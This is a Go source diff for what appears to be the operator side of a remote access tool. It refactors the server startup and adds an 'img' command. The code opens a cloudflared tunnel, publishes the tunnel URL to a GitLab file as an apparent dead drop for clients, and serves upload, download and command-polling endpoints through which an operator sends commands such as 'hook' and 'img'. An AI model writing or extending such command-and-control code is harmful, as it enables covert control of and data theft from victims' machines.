@@ -7,7 +7,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"net/url"
 	"os"
@@ -190,6 +189,64 @@ func downloadHandler(w http.ResponseWriter, r *http.Request) {
 	io.Copy(w, file)
 }
 
+func runServer() error {
+	if err := godotenv.Load(); err != nil {
+		return fmt.Errorf("loading .env file: %w", err)
+	}
+
+	gitlabToken := os.Getenv("TOKEN")
+
+	binPath := ensureCloudflared()
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	cmd := exec.CommandContext(
+		ctx,
+		"./"+binPath,
+		"tunnel",
+		"--protocol",
+		"http2",
+		"--url",
+		"http://localhost:10000",
+	)
+
+	cmd.Stdout = io.Discard
+	cmd.Stderr = &buf
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("starting cloudflared: %w", err)
+	}
+
+	go findTunnelURL()
+
+	tunnelURL = <-tunnelURLChan
+
+	time.Sleep(2 * time.Second)
+
+	fmt.Println("Tunnel is active.")
+	fmt.Println("The tunnel URL is:", tunnelURL)
+
+	if err := updateGitLabFile(
+		"Plexisity1%2Ftunnel-url",
+		"tunnel-url.txt",
+		gitlabToken,
+		tunnelURL,
+	); err != nil {
+		return fmt.Errorf("updating GitLab: %w", err)
+	}
+
+	http.HandleFunc("/upload", uploadHandler)
+	http.HandleFunc("/get-command", commandHandler)
+	http.HandleFunc("/download", downloadHandler)
+	http.HandleFunc("/progress", handleProgressUpdate)
+
+	go receiveInput()
+
+	fmt.Println("Receiver running on port 10000.")
+	return http.ListenAndServe(":10000", nil)
+}
+
 func commandHandler(w http.ResponseWriter, r *http.Request) {
 	mutex.Lock()
 	command := strings.Fields(userInput)
@@ -246,6 +303,19 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 		userInput = "idle"
 		fmt.Println("sent hook command")
 
+	case "img":
+		if len(command) < 2 {
+			fmt.Println("Invalid usage", userInput)
+			fmt.Println("Hint try img <path> <time to show>")
+			userInput = "idle"
+			break
+		} else {
+			fmt.Fprint(w, userInput)
+			command = nil
+			userInput = "idle"
+			fmt.Println("Sent img command")
+		}
+
 	case "help":
 		fmt.Print("\033[H\033[2J")
 
@@ -299,55 +369,14 @@ func receiveInput() {
 }
 
 func main() {
-	go serverUI()
-	err := godotenv.Load()
-	if err != nil {
-		log.Fatal("Error loading .env file")
-	}
-
-	gitlabToken := os.Getenv("TOKEN")
-
-	// Ensure the binary is present locally without needing a package manager
-	binPath := ensureCloudflared()
-
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
-	// Start cloudflared targeting your local server port
-	cmd := exec.CommandContext(ctx, "./"+binPath, "tunnel", "--protocol", "http2", "--url", "http://localhost:10000")
-	cmd.Stdout = io.Discard
-	cmd.Stderr = &buf
-
-	if err := cmd.Start(); err != nil {
-		fmt.Printf("Failed to start cloudflared: %v\n", err)
-		return
-	}
-
-	go findTunnelURL()
-	mutex.Lock()
-	tunnelURL = <-tunnelURLChan
-	mutex.Unlock()
-
-	time.Sleep(2 * time.Second)
-	fmt.Println("Tunnel is active. Press Ctrl+C to exit.")
-	fmt.Println("The tunnel url is: " + tunnelURL)
-
-	fmt.Println("Updating Gist with the tunnel URL...")
-
-	// Update the Gist with the tunnel URL
-	err = updateGitLabFile("Plexisity1%2Ftunnel-url", "tunnel-url.txt", gitlabToken, tunnelURL)
-	if err != nil {
-		fmt.Println("Error updating GitLab file:", err)
-		return
-	}
-
-	http.HandleFunc("/upload", uploadHandler)
-	http.HandleFunc("/get-command", commandHandler)
-	http.HandleFunc("/download", downloadHandler)
-	http.HandleFunc("/progress", handleProgressUpdate)
 
 	go receiveInput()
-	fmt.Println("Receiver running on port 10000. Waiting for media...")
-	panic(http.ListenAndServe(":10000", nil))
+	go func() {
+		if err := runServer(); err != nil {
+			fmt.Println(err)
+		}
+	}()
+
+	serverUI()
 
 }
